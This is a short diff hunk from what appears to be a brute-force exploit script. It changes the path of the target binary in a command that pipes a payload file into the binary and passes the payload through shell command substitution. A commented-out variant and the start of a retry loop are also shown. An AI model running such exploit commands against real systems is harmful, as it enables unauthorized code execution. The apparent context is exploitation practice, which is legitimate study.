@@ -330,7 +330,7 @@ def main():
 
     #performing brute force attack
     # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
-    exploit_command = f"cat payload - | {target} -c `cat payload`"
+    exploit_command = f"cat payload - | /mnt/binaries/{target} -c `cat payload`"
 
     i = 0
     while True:
